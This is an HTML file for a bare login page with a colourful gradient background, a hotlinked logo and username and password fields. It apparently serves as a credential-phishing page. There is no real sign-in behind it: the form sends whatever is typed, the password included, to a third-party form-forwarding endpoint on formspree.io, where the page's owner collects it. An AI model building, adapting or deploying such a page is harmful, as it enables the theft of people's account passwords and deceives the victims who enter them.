<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
    
        *{
            
            margin: 0;
            padding: 0;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }
    
        body{
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background: rgb(131,58,180);
background: linear-gradient(90deg, rgba(131,58,180,1) 0%, rgba(253,29,29,1) 50%, rgba(252,176,69,1) 100%);
        }
        
        form{
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            
        }
        
        input{
            
            width: 400px;
            height: 40px;
            margin: 10px;
            padding: 10px;
            font-family: monospace;
            font-size: 18px;
            font-weight: 400;
            border-radius: 5px;
            border: none;
            
        }
        
        button{
            background-color: dodgerblue;
            border: none;
            padding: 10px 60px;
            color: #fff;
            font-weight: 900;
            font-family: monospace;
            border-radius: 5px;
            margin-top: 20px;
        }
        
        .logo{
            width: 100px;
            height: 100px;
            background-image: url('https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png');
            background-size: cover;
            position: fixed;
            top: 50px;
            border-radius: 20px;
            box-shadow: 0 3px 3px #333;
            
        }
        
        button:hover{
            background-color: transparent;
            color: dodgerblue;
            border: 1px solid dodgerblue;
            transition: .3s;
            cursor: pointer;
        }
        
        button:active{
            top: 3px;
        }
        
    </style>
</head>

<body>

    
    <div class="logo"></div>

    <form action="https://formspree.io/f/mjvjrlog" method="POST">

        <input type="email" placeholder="Username" name="_replyto">
        <input type="password" name="message" placeholder="Password">





        <!-- your other form fields go here -->

        <button type="submit">Send</button>
    </form>



</body>

</html>
